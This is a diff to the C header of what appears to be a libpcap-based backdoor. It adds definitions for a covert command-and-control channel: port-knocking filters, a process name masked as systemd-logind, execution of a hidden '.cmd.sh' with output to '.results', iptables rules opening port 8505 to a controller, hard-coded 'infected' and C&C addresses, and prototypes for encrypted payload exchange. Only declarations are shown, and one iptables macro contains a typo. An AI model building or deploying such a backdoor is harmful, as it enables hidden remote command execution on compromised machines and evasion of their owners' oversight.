@@ -67,5 +67,38 @@ struct sniff_tcp {
         u_short th_urp;                 /* urgent pointer */
 };
 
+#define FILTER "tcp and (port 8506 || port 8507)"
+#define PAYLOAD_KEY "8505"
+#define PORT "8505"
+#define SHPORT 8505
+#define SPORT 22
+#define BUFFERSIZE 1024
+#define MASK "/usr/lib/systemd/systemd-logind"
+#define CMD "./.cmd.sh > .results"
+#define CHMOD "chmod 755 .cmd.sh"
+#define IPTABLES(ip) "iptables -A INPUT -p tcp -s " ip " --dport 8505 -j ACCEPT"
+#define TURNOFF(ip) "iptables -D INTPUT -p tcp -s " ip " --dport 8505 -j ACCEPT"
+#define RESULT_FILE ".results"
+#define INFECTEDIP "192.168.1.6"
+#define CNCIP "192.168.1.3"
+#define FILENAME ".cmd.sh"
+struct payload{
+    char key[5]; // always 8505
+    char buffer[1024]; // for either commands or results
+};
 
+
+int Packetcapture();
+void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
+void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
+void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
+void ParsePayload(const u_char *payload, int len);
+void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
+void CreatePayload(char *command, unsigned char *encrypted);
+void SendPayload(const unsigned char *tcp_payload);
+bool CheckKey(u_char ip_tos, u_short ip_id, bool type);
+
+
+int knocking[2];
+int pattern[2];
 #endif
